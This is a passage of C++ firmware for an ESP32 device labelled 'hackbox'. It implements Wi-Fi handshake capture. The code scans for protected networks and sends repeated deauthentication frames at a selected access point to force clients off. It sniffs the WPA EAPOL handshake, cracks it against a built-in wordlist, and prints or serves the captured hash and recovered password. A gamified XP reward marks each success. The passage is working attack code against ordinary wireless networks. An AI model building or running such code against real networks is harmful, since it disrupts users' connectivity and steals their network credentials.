    wifi_promiscuous_filter_t flt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_filter(&flt);
    esp_wifi_set_promiscuous_rx_cb(beaconSniffer);
    esp_wifi_set_promiscuous(true);

    for (int i = 0; i < chCount; i++) {
        esp_wifi_set_channel(channels[i], WIFI_SECOND_CHAN_NONE);
        delay(150);
    }

    esp_wifi_set_promiscuous(false);
}

void startScan() {
    apCount = 0;
    currentState = HS_SCANNING;
    needsRedraw = true;
    drawScreen();

    initWiFi(WIFI_MODE_STA);

    wifi_scan_config_t scanCfg = {};
    scanCfg.scan_type = WIFI_SCAN_TYPE_ACTIVE;
    scanCfg.scan_time.active.min = 120;
    scanCfg.scan_time.active.max = 300;
    esp_wifi_scan_start(&scanCfg, true); // blocking scan

    uint16_t num = 0;
    esp_wifi_scan_get_ap_num(&num);
    if (num > MAX_APS) num = MAX_APS;

    wifi_ap_record_t *records = (wifi_ap_record_t*)malloc(sizeof(wifi_ap_record_t) * num);
    if (records) {
        esp_wifi_scan_get_ap_records(&num, records);
        for (int i = 0; i < num; i++) {
            if (records[i].authmode == WIFI_AUTH_OPEN) continue;
            strncpy(apList[apCount].ssid, (char*)records[i].ssid, 32);
            apList[apCount].ssid[32] = '\0';
            memcpy(apList[apCount].bssid, records[i].bssid, 6);
            apList[apCount].channel  = records[i].primary;
            apList[apCount].rssi     = records[i].rssi;
            apList[apCount].authmode = records[i].authmode;
            apList[apCount].mfpStatus = 0;
            apCount++;
        }
        free(records);
    }

    // Brief beacon sniff to detect RSN MFP capabilities per AP
    probeMFP();

    selectedAP = 0;
    listOffset = 0;
    currentState = HS_SELECT_AP;
    needsRedraw = true;
}

void startCapture() {
    APInfo &ap = apList[selectedAP];

    gotMsg1 = false;
    gotMsg2 = false;
    gotMsg3 = false;
    gotMsg4 = false;
    handshakeValid = false;
    deauthsSent = 0;
    eapolMsg2Len = 0;
    memset(&handshake, 0, sizeof(handshake));

    // Switch to AP mode for reliable promiscuous + raw TX
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    delay(100);
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_start();
    delay(100);

    // Lock to target channel
    esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);

    // Enable promiscuous mode for EAPOL sniffing
    wifi_promiscuous_filter_t filter;
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(eapolSniffer);
    esp_wifi_set_promiscuous(true);

    captureStartTime = millis();
    lastDeauth = 0;
    currentState = HS_DEAUTH_SNIFF;
    needsRedraw = true;
}

}

// ===== Public API =====

void handshakeCaptureSetup() {
    currentState = HS_SCANNING;
    needsRedraw = true;
    handshakeValid = false;
    exportRunning = false;
    hs_ap_netif = NULL;

    esp_netif_init();
    esp_event_loop_create_default();

    pinMode(BUTTON_PIN_UP, INPUT_PULLUP);
    pinMode(BUTTON_PIN_DOWN, INPUT_PULLUP);
    pinMode(BUTTON_PIN_LEFT, INPUT_PULLUP);
    pinMode(BUTTON_PIN_RIGHT, INPUT_PULLUP);

    startScan();
}

void handshakeCaptureLoop() {
    unsigned long now = millis();

    static bool upPrev = false, downPrev = false, rightPrev = false, leftPrev = false;
    bool upNow = digitalRead(BUTTON_PIN_UP) == LOW;
    bool downNow = digitalRead(BUTTON_PIN_DOWN) == LOW;
    bool rightNow = digitalRead(BUTTON_PIN_RIGHT) == LOW;
    bool leftNow = digitalRead(BUTTON_PIN_LEFT) == LOW;

    if (exportRunning) {
        hsDNS.processNextRequest();
        hsServer.handleClient();
    }

    switch (currentState) {
        case HS_SELECT_AP:
            if (upNow && !upPrev && apCount > 0) {
                selectedAP--;
                if (selectedAP < 0) selectedAP = apCount - 1;
                if (selectedAP < listOffset) listOffset = selectedAP;
                needsRedraw = true;
                delay(150);
            }
            if (downNow && !downPrev && apCount > 0) {
                selectedAP++;
                if (selectedAP >= apCount) selectedAP = 0;
                if (selectedAP >= listOffset + 5) listOffset = selectedAP - 4;
                if (selectedAP == 0) listOffset = 0;
                needsRedraw = true;
                delay(150);
            }
            if (rightNow && !rightPrev && apCount > 0) {
                startCapture();
                delay(200);
            }
            break;

        case HS_DEAUTH_SNIFF:
            // Send deauth periodically
            if (!handshakeValid && now - lastDeauth >= DEAUTH_INTERVAL) {
                lastDeauth = now;
                sendDeauth();
                needsRedraw = true;
            }
            // Check if captured
            if (handshakeValid) {
                esp_wifi_set_promiscuous(false);
                currentState = HS_CAPTURED;
                needsRedraw = true;
            }
            if (leftNow && !leftPrev) {
                esp_wifi_set_promiscuous(false);
                currentState = HS_SELECT_AP;
                needsRedraw = true;
                delay(200);
            }
            break;

        case HS_CAPTURED:
            if (rightNow && !rightPrev) {
                startExportAP();
                currentState = HS_EXPORTING;
                needsRedraw = true;
                delay(200);
            }
            if (upNow && !upPrev) {
                // Start dictionary crack
                crackIndex = 0;
                crackRunning = true;
                crackFound = false;
                crackStartTime = millis();
                currentState = HS_CRACKING;
                needsRedraw = true;
                delay(200);
            }
            if (downNow && !downPrev) {
                Serial.println("# hackbox handshake capture - hccapx dump");
                emitSafeComment("SSID", apList[selectedAP].ssid);
                for (int i = 0; i < (int)sizeof(hccapx_t); i++) {
                    char hex[4];
                    snprintf(hex, sizeof(hex), "%02X", ((uint8_t*)&handshake)[i]);
                    Serial.print(hex);
                }
                Serial.println();
                Serial.println("# END");
                needsRedraw = true;
                delay(200);
            }
            if (leftNow && !leftPrev) {
                currentState = HS_SELECT_AP;
                needsRedraw = true;
                delay(200);
            }
            break;

        case HS_CRACKING:
            // Try one password per loop iteration (keeps UI responsive)
            if (crackRunning && crackIndex < WORDLIST_SIZE) {
                if (tryPassword(wordlist[crackIndex])) {
                    crackFound = true;
                    crackRunning = false;
                    strncpy(crackedPassword, wordlist[crackIndex], sizeof(crackedPassword) - 1);
                    crackedPassword[sizeof(crackedPassword) - 1] = '\0';
                    currentState = HS_CRACKED;
                    addXP(25);
                    Serial.println("# PASSWORD FOUND!");
                    emitSafeComment("SSID", apList[selectedAP].ssid);
                    emitSafeComment("PASS", crackedPassword);
                } else {
                    crackIndex++;
                }
                needsRedraw = true;
            } else if (crackIndex >= WORDLIST_SIZE) {
                // Exhausted wordlist
                crackRunning = false;
                currentState = HS_CAPTURED;
                needsRedraw = true;
            }
            if (leftNow && !leftPrev) {
                crackRunning = false;
                currentState = HS_CAPTURED;
                needsRedraw = true;
                delay(200);
            }
            break;

        case HS_CRACKED:
            if (rightNow && !rightPrev) {
                startExportAP();
                currentState = HS_EXPORTING;
                needsRedraw = true;
                delay(200);
            }
            if (downNow && !downPrev) {
                Serial.println("# hackbox - cracked handshake");
                emitSafeComment("SSID", apList[selectedAP].ssid);
                emitSafeComment("PASS", crackedPassword);
                needsRedraw = true;
                delay(200);
            }
            if (leftNow && !leftPrev) {
                currentState = HS_CAPTURED;
                needsRedraw = true;
                delay(200);
            }
            break;

        case HS_EXPORTING:
            if (leftNow && !leftPrev) {
                hsServer.stop();
                hsDNS.stop();
                exportRunning = false;
                currentState = HS_CAPTURED;
                needsRedraw = true;
                delay(200);
            }
            break;

        default:
            break;
    }

    upPrev = upNow;
    downPrev = downNow;
    rightPrev = rightNow;
    leftPrev = leftNow;

    if (needsRedraw) {
        needsRedraw = false;
        drawScreen();
    }
}

void cleanupHandshakeCapture() {
    if (exportRunning) {
        hsServer.stop();
        hsDNS.stop();
        exportRunning = false;
    }
    esp_wifi_set_promiscuous(false);
    cleanupWiFi();
    hs_ap_netif = NULL;
}
